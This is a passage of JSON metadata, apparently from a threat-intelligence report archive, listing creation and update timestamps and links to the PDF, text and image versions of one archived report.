    "ts_created_at": 1677809239,
    "ts_updated_at": 1743041159,
    "ts_creation_date": 1677662432,
    "ts_modification_date": 1677662432,
    "files": {
        "pdf": "https://archive.orkl.eu/85421dd4c09820beb86f28546dfb8b008afe9a83.pdf",
        "text": "https://archive.orkl.eu/85421dd4c09820beb86f28546dfb8b008afe9a83.txt",
        "img": "https://archive.orkl.eu/85421dd4c09820beb86f28546dfb8b008afe9a83.jpg"
    }
}